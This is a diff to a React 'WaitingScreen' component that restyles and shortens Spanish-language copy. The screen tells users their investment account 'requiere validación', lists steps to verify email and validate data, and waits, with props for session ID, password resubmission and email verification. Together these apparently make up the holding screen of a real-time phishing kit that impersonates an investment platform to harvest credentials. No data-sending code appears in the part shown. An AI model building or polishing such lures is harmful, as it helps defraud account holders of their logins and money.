@@ -80,62 +80,62 @@ const WaitingScreen = ({ email, errorMessage, sessionId, onPasswordResubmit, onV
 
   return (
     <div className="flex flex-col items-center text-center">
-      <div className="mb-5 flex h-16 w-16 items-center justify-center rounded-2xl border border-primary/15 bg-primary/10 shadow-sm">
+      <div className="mb-4 flex h-16 w-16 items-center justify-center rounded-2xl border border-primary/15 bg-primary/10 shadow-sm">
         <Loader2 className="h-8 w-8 animate-spin text-primary" />
       </div>
 
-      <div className="mb-4 inline-flex items-center rounded-full border border-primary/20 bg-primary/10 px-3 py-1 text-xs font-medium text-primary">
+      <div className="mb-3 inline-flex items-center rounded-full border border-primary/20 bg-primary/10 px-3 py-1 text-[11px] font-medium text-primary">
         Actualización segura en curso
       </div>
 
-      <h3 className="mb-2 text-xl font-semibold text-foreground">
-        Tu cuenta requiere una actualización cadastral
+      <h3 className="mb-1.5 text-lg font-semibold text-foreground">
+        Tu cuenta requiere validación
       </h3>
-      <p className="max-w-sm text-sm leading-6 text-muted-foreground">
-        Necesitamos verificar algunos datos por la seguridad de tu cuenta y de tus inversiones. Para continuar, seguí las etapas de validación indicadas a continuación.
+      <p className="max-w-sm text-xs leading-5 text-muted-foreground">
+        Necesitamos confirmar algunos datos para proteger tu cuenta y tus inversiones.
       </p>
-
-      <div className="mt-5 w-full rounded-xl border border-border bg-muted/40 p-4 text-left">
-        <div className="mb-3 flex items-center gap-2 text-sm font-medium text-foreground">
-          <ShieldCheck className="h-4 w-4 text-primary" />
-          Proceso protegido
-        </div>
-
-        <div className="space-y-3">
-          {[
-            "Verificá tu email para confirmar el acceso.",
-            "Validá los datos solicitados para proteger tu cuenta.",
-            "Completá la revisión para seguir operando con normalidad.",
-          ].map((item, index) => (
-            <div key={item} className="flex items-start gap-3 rounded-lg border border-border/70 bg-background/80 px-3 py-2.5">
-              <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-semibold text-primary">
-                {index + 1}
-              </span>
-              <p className="text-sm leading-5 text-muted-foreground">{item}</p>
-            </div>
-          ))}
-        </div>
-      </div>
-
-      <div className="mt-4 w-full rounded-xl border border-border bg-secondary/30 px-4 py-3 text-left">
-        <div className="flex items-start gap-3">
-          <CircleAlert className="mt-0.5 h-4 w-4 shrink-0 text-primary" />
-          <p className="text-xs leading-5 text-muted-foreground">
-            Este proceso forma parte de una revisión de seguridad de la cuenta y puede tomar unos instantes.
-          </p>
-        </div>
-      </div>
 
       {onVerifyEmail && (
         <button
           type="button"
           onClick={onVerifyEmail}
-          className="mt-6 flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-3 text-sm font-semibold text-primary-foreground transition-colors hover:bg-primary/90"
+          className="mt-5 flex w-full items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3.5 text-sm font-semibold text-primary-foreground shadow-sm ring-1 ring-primary/20 transition-all hover:bg-primary/90"
         >
           <Mail className="h-4 w-4" />
           Verificar email
         </button>
       )}
+
+      <div className="mt-4 w-full rounded-xl border border-border bg-muted/40 p-3.5 text-left">
+        <div className="mb-2.5 flex items-center gap-2 text-xs font-medium text-foreground">
+          <ShieldCheck className="h-4 w-4 text-primary" />
+          Proceso protegido
+        </div>
+
+        <div className="space-y-2">
+          {[
+            "Verificá tu email para confirmar el acceso.",
+            "Validá los datos solicitados.",
+            "Completá la revisión para seguir operando.",
+          ].map((item, index) => (
+            <div key={item} className="flex items-start gap-2.5 rounded-lg border border-border/70 bg-background/80 px-3 py-2">
+              <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-primary/10 text-[10px] font-semibold text-primary">
+                {index + 1}
+              </span>
+              <p className="text-xs leading-4.5 text-muted-foreground">{item}</p>
+            </div>
+          ))}
+        </div>
+      </div>
+
+      <div className="mt-3 w-full rounded-xl border border-border bg-secondary/30 px-3.5 py-2.5 text-left">
+        <div className="flex items-start gap-2.5">
+          <CircleAlert className="mt-0.5 h-4 w-4 shrink-0 text-primary" />
+          <p className="text-[11px] leading-4.5 text-muted-foreground">
+            Esta revisión de seguridad puede tomar unos instantes.
+          </p>
+        </div>
+      </div>
 
       <p className="mt-4 text-xs text-muted-foreground/60 break-all">
         {email}
